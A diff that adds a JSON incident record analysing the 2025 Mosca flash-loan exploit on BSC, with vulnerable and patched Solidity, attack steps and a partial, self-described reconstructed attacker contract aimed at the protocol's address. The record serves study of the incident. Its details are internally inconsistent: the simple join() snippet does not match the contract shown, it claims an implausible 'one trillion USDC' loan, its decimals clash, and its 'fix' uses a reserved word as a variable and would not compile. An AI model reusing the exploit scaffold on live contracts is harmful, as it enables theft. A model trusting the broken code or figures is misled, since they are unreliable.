@@ -1,0 +1,37 @@
+{
+ "id": "2025__2025-01-10_Mosca_FlashLoanStateManipulation",
+ "source_file": "2025/2025-01-10_Mosca_FlashLoanStateManipulation.md",
+ "title": "Mosca — Flash Loan-Based State Manipulation Analysis",
+ "date": "2025-01-10",
+ "protocol": "Mosca",
+ "chain": "BSC",
+ "loss_raw": "~$19,000",
+ "loss_usd": 19000.0,
+ "root_cause": "Lack of fund source validation and state management error during repeated join/exit calls, allowing flash loan funds to be treated as legitimate deposits and enabling excess withdrawals",
+ "attack_tx": "0x4e5bb7e3...",
+ "vulnerable_contract": "0x1962b335...",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: join allowed without fund source validation\nfunction join(uint256 amount) external {\n    // Only records transferred amount — no flash loan check\n    userBalance[msg.sender] += amount;\n    totalDeposits += amount;\n    IERC20(USDC).transferFrom(msg.sender, address(this), amount);\n}\n\nfunction exit() external {\n    uint256 amount = userBalance[msg.sender];\n    userBalance[msg.sender] = 0;\n    // Withdrawal without state reset → totalDeposits mismatch across repeated cycles\n    IERC20(USDC).transfer(msg.sender, amount);\n}\n\n//",
+  "pragma solidity ^0.8.20;\n\ncontract Mosca is ReentrancyGuard {\n    IERC20 public usdt;\n    IERC20 public usdc;\n\n    struct User {\n        uint256 balance;      // internal Mosca-unit balance (not 1:1 with real tokens)\n        uint256 balanceUSDT;\n        uint256 balanceUSDC;\n        uint256 nextDeadline;\n        uint256 bonusDeadline;\n        uint256 runningCount;\n        uint256 inviteCount;\n        uint256 refCode;\n        uint256 collectiveCode;\n        address walletAddress;\n        bool enterprise;\n    }\n\n    mapping(address => User) public users;\n    mapping(uint256 => address) public referrers;\n    mapping(address => uint256) public refByAddr;\n\n    uint256 public JOIN_FEE = 28 * 1e18;\n    uint256 public TAX      =  3 * 1e18;\n\n    // ❌ VULNERABLE: join() credits user.balance with baseAmount - JOIN_FEE\n    // and then calls cascade() which credits MORE balance to up to 10 referrers —\n    // all from internal ledger entries, not from real token inflows\n    function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant {\n        User storage user = users[msg.sender];\n        uint256 diff = user.balance > 127 * 10 ** 18 ? user.balance - 127 * 10 ** 18 : 0;\n\n        uint256 baseAmount = ((amount + diff) * 1000) / 1015;\n\n        // ... (fee/tax transfers to contract and owner) ...\n        require(usdc.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n        require(usdc.transferFrom(msg.sender, owner, TAX * 3), \"Transfer failed\");\n\n        user.nextDeadline  = block.timestamp + 28 days;\n        user.bonusDeadline = block.timestamp + 7 days;\n        user.walletAddress = msg.sender;\n        totalRevenue += amount;\n        user.balance += baseAmount - JOIN_FEE; // ❌ credited from formula, not from token balance\n\n        // ❌ cascade() additionally credits up to 10 referrer accounts in the MLM tree\n        cascade(msg.sender);          // ❌ further inflates referrer.balance entries\n        distributeFees(msg.sender, amount); // ❌ also credits referrer.balance via transfer fees\n    }\n\n    // ❌ cascade() mints virtual balance to referrers — no real token backing\n    function cascade(address tempAddress) private {\n        User storage user = users[tempAddress];\n        address referrer = referrers[user.collectiveCode];\n        uint256 depth = 0;\n        while (referrer != address(0) && depth < 10) {\n            if (users[referrer].inviteCount < 3 && depth >= 2) {\n                depth++;\n            } else {\n                users[referrer].balance += (tierRewards[depth] * 10 ** 18) / 100; // ❌ pure ledger credit\n                emit RewardEarned(referrer, block.timestamp, (tierRewards[depth] * 10 ** 18) / 100);\n                depth++;\n            }\n            referrer = referrers[users[referrer].collectiveCode];\n        }\n    }\n\n    // ❌ VULNERABLE: exitProgram() calls withdrawAll() which pays out the entire\n    // inflated internal balance in real tokens without solvency validatio"
+ ],
+ "code_after": [
+  "✅ Safe code: reentrancy protection + fund source validation\nfunction join(uint256 amount) external nonReentrant {\n    require(amount > 0, \"Zero amount\");\n    uint256 before = IERC20(USDC).balanceOf(address(this));\n    IERC20(USDC).transferFrom(msg.sender, address(this), amount);\n    uint256 actual = IERC20(USDC).balanceOf(address(this)) - before;\n    userBalance[msg.sender] += actual; // Record actual amount received\n    totalDeposits += actual;\n}",
+  "// ✅ Fix: track actual deposited principal separately; cap withdrawals to it\nmapping(address => uint256) public depositedPrincipal;\n\nfunction join(uint256 amount, ...) external nonReentrant {\n    // ... fee deductions ...\n    uint256 netDeposit = amount - (TAX * 3);\n    depositedPrincipal[msg.sender] += netDeposit; // ✅ track real inflow\n    user.balance += baseAmount - JOIN_FEE;\n    // ...\n}\n\nfunction withdrawAll(address addr) private {\n    User storage user = users[addr];\n    require(msg.sender == user.walletAddress, \"Wallet addresses do not match\");\n    uint256 payable = depositedPrincipal[addr]; // ✅ only pay back what was actually deposited\n    depositedPrincipal[addr] = 0;\n    usdc.transfer(user.walletAddress, payable);\n}"
+ ],
+ "steps": [
+  "→ [1] Call join() with 1,000 USDC (legitimate deposit)",
+  "→ [2] Obtain 1 trillion USDC flash loan from PancakeSwap V3",
+  "→ [3] Call join() 7 times with 1,000 each (using flash loan funds)",
+  "→ [4] Call exit() 2 times",
+  "→ [5] Repeat join() + exit() cycle 20 times",
+  "→ [6] Repay flash loan",
+  "→ [7] Secure ~$19,000 profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Call join() with 1,000 USDC (legitimate deposit)\n  │\n  ├─→ [2] Obtain 1 trillion USDC flash loan from PancakeSwap V3\n  │\n  ├─→ [3] Call join() 7 times with 1,000 each (using flash loan funds)\n  │         └─ Protocol treats flash loan funds as legitimate deposits\n  │\n  ├─→ [4] Call exit() 2 times\n  │         └─ Accumulated incorrect state enables excess withdrawal\n  │\n  ├─→ [5] Repeat join() + exit() cycle 20 times\n  │         └─ Protocol balance decreases with each cycle\n  │\n  ├─→ [6] Repay flash loan\n  │\n  └─→ [7] Secure ~$19,000 profit",
+  "// Full PoC not available — reconstructed from summary\n\ncontract MoscaAttacker {\n    address constant MOSCA = 0x1962b3356122d6a56f978e112d14f5e23a25037d;\n    address constant USDC = /* USDC address */;\n\n    function attack() external {\n        // [1] Legitimate initial deposit\n        IERC20(USDC).approve(MOSCA, type(uint256).max);\n        IMosca(MOSCA).join(1000 * 1e6);\n\n        // [2] PancakeSwap V3 flash loan (1 trillion USDC)\n        IPancakeV3Pool(pool).flash(\n            address(this), 0, 1_000_000_000_000 * 1e6, \"\"\n        );\n    }\n\n    function pancakeV3FlashCallback(...) external {\n        // [3] join() 7 times using flash loan funds\n        for (uint256 i = 0; i < 7; i++) {\n            IMosca(MOSCA).join(1000 * 1e6);\n        }\n\n        // [4] exit() 2 times (excess withdrawal)\n  "
+ ]
+}
